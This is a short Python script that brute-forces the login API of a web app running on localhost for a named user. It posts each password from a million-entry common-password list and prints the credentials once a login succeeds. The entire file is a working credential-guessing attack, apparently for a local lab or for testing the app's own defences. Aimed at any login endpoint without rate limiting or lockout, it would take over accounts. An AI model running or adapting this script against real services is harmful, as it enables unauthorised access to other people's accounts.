import requests
import time

url = "http://localhost:3002/api/login"
username = 'Niilo'


def brute_force_password():
  
  # Go through most common million passwords (Found from here https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/)
  with open('top-million-pwd.txt', 'r') as f:
    passwords = f.read().split("\n")

    for password in passwords:
      data = {'username': username, 'password': password}
      res = requests.post(url, json=data)
      time.sleep(0.01)
      print(res.status_code, password)
      if res.status_code == 200:
        return password
    
    print("Password not found.")


pwd = brute_force_password()

if pwd:
  print()
  print(f"Credentials:\nUser: {username}\nPassword: {pwd}")